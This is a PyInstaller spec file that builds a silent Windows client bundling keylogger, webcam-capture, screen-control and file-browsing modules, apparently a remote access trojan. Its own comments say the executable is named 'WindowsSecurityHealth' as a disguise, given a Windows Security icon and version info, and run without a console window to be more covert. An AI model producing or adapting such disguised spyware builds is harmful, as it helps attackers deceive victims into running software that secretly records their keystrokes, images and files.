# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['../client/client_silent.py'],
    pathex=['../', '../Server'],
    binaries=[],
    datas=[],
    hiddenimports=[
        'PIL',
        'PIL._tkinter_finder',
        'pyautogui',
        'ctypes',
        'ctypes.wintypes',
        'protocol',
        'cv2',
        'modules.photo',
        'pynput',
        'pynput.keyboard',
        'modules.keylogger',
        'modules.file_browser'
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='WindowsSecurityHealth',  # 伪装名称
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # 无控制台窗口，更隐蔽
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon='windowsecu.ico',  # 使用用户提供的Windows安全图标
    version='version_info.txt',  # 版本信息文件
) 